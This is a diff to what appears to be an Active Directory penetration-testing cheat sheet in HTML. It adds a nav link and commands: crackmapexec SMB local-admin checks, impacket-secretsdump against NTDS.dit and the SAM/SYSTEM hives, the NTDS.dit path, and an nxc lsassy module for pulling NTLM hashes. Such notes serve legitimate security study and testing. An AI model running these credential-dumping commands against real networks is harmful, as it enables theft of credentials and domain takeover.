@@ -100,6 +100,7 @@
                                 <a href="lateralMovement.html">Lateral Movement</a>
                                 <a href="metodologie.html">Methodology</a>
                                 <a href="ADprivesc.html">ADprivesc</a>
+                                <a href="adset.html">set AD Flow</a>
                         </div>
                 </div>
 
@@ -707,7 +708,8 @@ bloodhound-python -u user -p 'Password123!' \
 
                                 <h3>Check Local Admin Access</h3>
                                 <pre><code>
-crackmapexec smb 192.168.1.0/24 -u user -p 'Password123!' -d corp.com
+crackmapexec smb 192.168.1.0/24 -u user -p 'Password123!' -d corp.com 
+crackmapexec smb 192.168.1.0/24 -u user -p 'Password123!' -d corp.com --local-auth
                 </code></pre>
 
                                 <p>If you see (Pwn3d!) → You are local admin</p>
@@ -751,7 +753,12 @@ crackmapexec winrm &lt;IP&gt; -u user -H hashes
 impacket-secretsdump corp.com/user:Password123!@&lt;IP&gt;
 
 # using ntds and system files
+#We can find ntds file on C:\Windows\NTDS\ntds.dit
 impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL
+impacket-secretsdump -sam SAM -system SYSTEM LOCAL
+
+#NTLM hashes
+nxc smb 192.168.219.141 -u user -p password -M lsassy
                 </code></pre>
 
 
